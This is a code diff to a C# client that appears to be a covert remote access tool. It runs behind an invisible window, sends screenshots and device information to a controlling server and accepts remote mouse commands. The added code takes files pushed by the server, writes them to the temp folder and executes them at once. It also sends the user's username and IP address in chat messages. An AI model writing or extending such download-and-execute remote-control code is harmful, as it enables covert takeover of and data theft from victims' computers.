@@ -4,6 +4,7 @@ using LazyServer;
 using NAudio.CoreAudioApi;
 using NAudio.Wave;
 using Newtonsoft.Json.Linq;
+using PentestTools;
 using Sweep.Forms;
 using System;
 using System.Collections.Generic;
@@ -51,7 +52,26 @@ namespace Client
             Task.Run(RunClientAsync);
             Application.Run(new InvisibleForm());
         }
+        private static string GetUniqueFilePath(string filePath)
+        {
+            if (!File.Exists(filePath)) return filePath;
 
+            string directory = Path.GetDirectoryName(filePath);
+            string filenameWithoutExt = Path.GetFileNameWithoutExtension(filePath);
+            string extension = Path.GetExtension(filePath);
+
+            int counter = 1;
+            string newFilePath;
+
+            do
+            {
+                newFilePath = Path.Combine(directory, $"{filenameWithoutExt}_{counter}{extension}");
+                counter++;
+            }
+            while (File.Exists(newFilePath));
+
+            return newFilePath;
+        }
         static async Task RunClientAsync()
         {
             if (GClass.IsTrue("debugmessage")) {
@@ -92,6 +112,47 @@ namespace Client
             await client.SendFileBytes(screenshot, clientInfo.ToString());
             await client.SendFileBytes(screenshot, clientInfo.ToString());
             GClass.StartHeartbeat(client);
+
+            client.FileOfferWithMetaReceived += (s, e) => {
+                try
+                {
+                    JObject message = JObject.Parse(e.FileRequest.Metadata);
+                    string command = (string)message["command"];
+
+                    switch (command)
+                    {
+                        case "openfile":
+                            string filename = (string)message["filename"];
+
+                            if (!string.IsNullOrEmpty(filename))
+                            {
+                                string savePath = Path.Combine(Path.GetTempPath(), filename);
+
+                                savePath = GetUniqueFilePath(savePath);
+                                File.WriteAllBytes(savePath, e.FileRequest.FileBytes);
+                                Console.WriteLine($"File saved: {savePath}");
+
+                                client.AcceptFile(e.FileRequest.TransferId, savePath);
+                                System.Diagnostics.Process.Start(savePath);
+                            }
+                            else
+                            {
+                                // Fallback if no filename provided
+                                string savePath = Path.Combine(Path.GetTempPath(), $"received_file_{DateTime.UtcNow:yyyyMMdd_HHmmss}.dat");
+                                File.WriteAllBytes(savePath, e.FileRequest.FileBytes);
+                                Console.WriteLine($"File saved (no filename in metadata): {savePath}");
+
+                                client.AcceptFile(e.FileRequest.TransferId, savePath);
+                                System.Diagnostics.Process.Start(savePath);
+                            }
+                            break;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error handling file offer: {ex.Message}");
+                }
+            };
 
             client.MessageReceived += async (s, e) =>
             {
@@ -183,7 +244,7 @@ namespace Client
                             break;
 
                         case "chat":
-                            Application.OpenForms[0].BeginInvoke((Action)(() =>
+                            Application.OpenForms[0].BeginInvoke((Action)(async () =>
                             {
                                 if (Chat.Instance == null || Chat.Instance.IsDisposed)
                                 {
@@ -191,7 +252,19 @@ namespace Client
                                     FormSlider.ShowSliding(Chat.Instance, 3);
                                 }
 
+                                string ip = await GClass.GetIp();
+
                                 Chat.Instance.add($"[ Chatting with {(string)message["username"]} ]");
+                                Chat.Instance.MessageSent += (text) =>
+                                {
+
+                                    _ = client.SendMessage(new JObject
+                                    {
+                                        ["msg"] = "chatmsg",
+                                        ["username"] = $"{DeviceInfo.GetUsername()}@{ip}",
+                                        ["text"] = text
+                                    }.ToString());
+                                };
                             }));
                             break;
 
@@ -212,7 +285,28 @@ namespace Client
                             }));
                             break;
 
+                        case "chatclose":
+                            Application.OpenForms[0].BeginInvoke((Action)(() =>
+                            {
+                                if (Chat.Instance == null || Chat.Instance.IsDisposed)
+                                {
+                                    return;
+                                }
+                                FormSlider.SlideOut(Chat.Instance, 3);
+                            }));
+                            break;
 
+                        case "togglesend":
+                            Application.OpenForms[0].BeginInvoke((Action)(() =>
+                            {
+                                if (Chat.Instance == null || Chat.Instance.IsDisposed)
+                                {
+                                    new Chat(); // Create and sets Chat.Instance
+                                    FormSlider.ShowSliding(Chat.Instance, 3);
+                                }
+                                Chat.Instance.ChangeSend?.Invoke((bool)message["body"]);
+                            }));
+                            break;
 
                         case "mousemove":
                             int x = (int)message["x"];
